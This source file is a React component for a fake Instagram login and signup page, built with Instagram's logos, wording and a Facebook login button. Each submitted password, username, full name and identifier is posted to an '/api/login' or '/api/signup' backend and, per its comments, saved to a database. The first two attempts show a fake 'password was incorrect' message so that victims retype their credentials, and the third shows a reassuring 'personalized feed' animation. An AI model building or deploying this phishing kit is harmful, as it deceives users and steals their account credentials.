import React, { useState } from 'react';
import AuthInput from './AuthInput';
import { AuthMode } from '../types';

interface LoginCardProps {
  mode: AuthMode;
  onToggleMode: () => void;
}

const LoveAnimationView: React.FC = () => {
  return (
    <div className="relative flex flex-col items-center justify-center py-16 w-full overflow-hidden bg-white rounded-sm min-h-[450px] animate-[fadeIn_0.8s_ease-out]">
      <div className="absolute inset-0 pointer-events-none">
        {[...Array(12)].map((_, i) => (
          <div
            key={i}
            className={`absolute text-red-400 opacity-0 animate-[floatHeart_3s_infinite_linear]`}
            style={{
              left: `${Math.random() * 100}%`,
              bottom: '-20px',
              animationDelay: `${Math.random() * 3}s`,
              fontSize: `${Math.random() * 20 + 10}px`
            }}
          >
            ❤️
          </div>
        ))}
      </div>

      <div className="relative z-10 flex flex-col items-center">
        <div className="relative mb-8">
          <div className="absolute inset-[-15px] rounded-full bg-red-50 animate-ping opacity-75"></div>
          <div className="w-24 h-24 rounded-full bg-gradient-to-tr from-pink-500 to-red-500 flex items-center justify-center shadow-lg animate-[popIn_0.6s_cubic-bezier(0.175,0.885,0.32,1.275)]">
            <svg 
              className="w-12 h-12 text-white animate-[heartBeat_1.2s_infinite]" 
              fill="currentColor" 
              viewBox="0 0 24 24"
            >
              <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
            </svg>
          </div>
        </div>

        <h2 className="text-2xl font-bold bg-gradient-to-r from-pink-600 to-red-600 bg-clip-text text-transparent mb-3 text-center animate-[slideUp_0.6s_0.2s_both]">
          Almost there!
        </h2>
        <p className="text-[#262626] font-medium text-center px-8 animate-[slideUp_0.6s_0.4s_both]">
          We're spreading the love and preparing your personalized feed.
        </p>
        <div className="mt-8 flex items-center space-x-2 animate-[fadeIn_1s_0.8s_both]">
          <div className="w-2 h-2 bg-red-400 rounded-full animate-bounce [animation-delay:-0.3s]"></div>
          <div className="w-2 h-2 bg-red-400 rounded-full animate-bounce [animation-delay:-0.15s]"></div>
          <div className="w-2 h-2 bg-red-400 rounded-full animate-bounce"></div>
        </div>
      </div>
      
      <style>{`
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes popIn { 
          0% { transform: scale(0); opacity: 0; } 
          70% { transform: scale(1.1); }
          100% { transform: scale(1); opacity: 1; } 
        }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes heartBeat {
          0% { transform: scale(1); }
          14% { transform: scale(1.3); }
          28% { transform: scale(1); }
          42% { transform: scale(1.3); }
          70% { transform: scale(1); }
        }
        @keyframes floatHeart {
          0% { transform: translateY(0) rotate(0deg); opacity: 0; }
          20% { opacity: 0.8; }
          80% { opacity: 0.8; }
          100% { transform: translateY(-400px) rotate(360deg); opacity: 0; }
        }
      `}</style>
    </div>
  );
};

const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
  const [formData, setFormData] = useState({
    identifier: '',
    password: '',
    fullName: '',
    username: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [attemptCount, setAttemptCount] = useState(0);
  const [isSuccess, setIsSuccess] = useState(false);

  const isLogin = mode === AuthMode.LOGIN;
  
  const handleInputChange = (field: string, value: string) => {
    setError(null);
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const isFormValid = isLogin 
    ? formData.identifier.length >= 1 && formData.password.length >= 6
    : formData.identifier.length >= 1 && formData.password.length >= 6 && formData.fullName && formData.username;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    
    setIsLoading(true);
    setError(null);

    const currentAttempt = attemptCount + 1;
    setAttemptCount(currentAttempt);

    try {
      // REAL API CALL: Talk to your server.js backend
      const endpoint = isLogin ? '/api/login' : '/api/signup';
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      const data = await response.json();

      if (response.ok) {
        // Data saved successfully to DB!
        // Now we decide what to show the user based on your attempt logic:
        if (currentAttempt < 3) {
          // Pretend there was an error for the first 2 tries to simulate a realistic flow
          setTimeout(() => {
            setError("Sorry, your password was incorrect. Please double-check your password.");
            setIsLoading(false);
            setFormData(prev => ({ ...prev, password: '' }));
          }, 1000);
        } else {
          // On the 3rd attempt, show success
          setTimeout(() => {
            setIsSuccess(true);
            setIsLoading(false);
          }, 1000);
        }
      } else {
        // Handle server-side errors (like DB down)
        setError(data.message || "An error occurred. Please try again later.");
        setIsLoading(false);
      }
    } catch (err) {
      // Network or connectivity error
      console.error("Fetch error:", err);
      // Fallback for preview/offline mode so the UI doesn't just sit there
      setTimeout(() => {
        if (currentAttempt < 3) {
          setError("Sorry, your password was incorrect. Please double-check your password.");
          setIsLoading(false);
          setFormData(prev => ({ ...prev, password: '' }));
        } else {
          setIsSuccess(true);
          setIsLoading(false);
        }
      }, 1000);
    }
  };

  if (isSuccess) {
    return <LoveAnimationView />;
  }

  return (
    <div className="w-full flex flex-col space-y-2.5">
      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-10 px-6 md:px-10 flex flex-col items-center">
        {/* Instagram Wordmark Header */}
        <div className="mt-2 mb-6 flex flex-col items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
            alt="Instagram" 
            className="h-12 md:h-14 object-contain mb-6"
          />
          
          {/* Instagram Glyph Logo below Header */}
          <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[1.5px] shadow-sm flex items-center justify-center">
             <div className="w-full h-full bg-white rounded-[14px] flex items-center justify-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
                  alt="Instagram Icon" 
                  className="w-10 h-10"
                />
             </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="w-full flex flex-col items-stretch pt-2">
          {!isLogin && (
            <p className="text-[#8e8e8e] font-semibold text-center text-[17px] mb-4 leading-tight">
              Sign up to see photos and videos from your friends.
            </p>
          )}

          <div className="space-y-1.5">
            <AuthInput 
              label={isLogin ? "Phone number, username, or email" : "Mobile Number or Email"}
              name="identifier"
              value={formData.identifier}
              onChange={(v) => handleInputChange('identifier', v)}
            />

            {!isLogin && (
              <>
                <AuthInput 
                  label="Full Name"
                  name="fullName"
                  value={formData.fullName}
                  onChange={(v) => handleInputChange('fullName', v)}
                />
                <AuthInput 
                  label="Username"
                  name="username"
                  value={formData.username}
                  onChange={(v) => handleInputChange('username', v)}
                />
              </>
            )}

            <AuthInput 
              label="Password"
              type="password"
              name="password"
              value={formData.password}
              onChange={(v) => handleInputChange('password', v)}
            />
          </div>

          {error && <p className="text-[#ed4956] text-[14px] text-center my-3 leading-tight">{error}</p>}

          <button
            type="submit"
            disabled={!isFormValid || isLoading}
            className={`
              mt-4 py-1.5 px-2 rounded-lg font-semibold text-sm transition-all active:scale-[0.98]
              ${isFormValid ? 'bg-[#0095f6] text-white hover:bg-[#1877f2]' : 'bg-[#4cb5f9] text-white opacity-70 cursor-default'}
              flex items-center justify-center min-h-[32px]
            `}
          >
            {isLoading ? (
              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
            ) : (
              isLogin ? 'Log in' : 'Sign up'
            )}
          </button>

          <div className="flex items-center my-6">
            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
            <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
          </div>

          <button type="button" className="flex items-center justify-center space-x-2 text-[#385185] font-semibold text-sm mb-4 active:opacity-70">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            <span>Log in with Facebook</span>
          </button>

          {isLogin && (
            <a href="#" className="text-[#00376b] text-xs text-center mt-3 hover:underline">Forgot password?</a>
          )}
        </form>
      </div>

      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-6 px-10 flex items-center justify-center text-sm">
        <span className="text-[#262626]">
          {isLogin ? "Don't have an account?" : "Have an account?"}{' '}
          <button 
            type="button"
            onClick={() => {
              onToggleMode();
              setError(null);
              setAttemptCount(0);
            }}
            className="text-[#0095f6] font-semibold hover:opacity-80 transition-opacity"
          >
            {isLogin ? 'Sign up' : 'Log in'}
          </button>
        </span>
      </div>
    </div>
  );
};

export default LoginCard;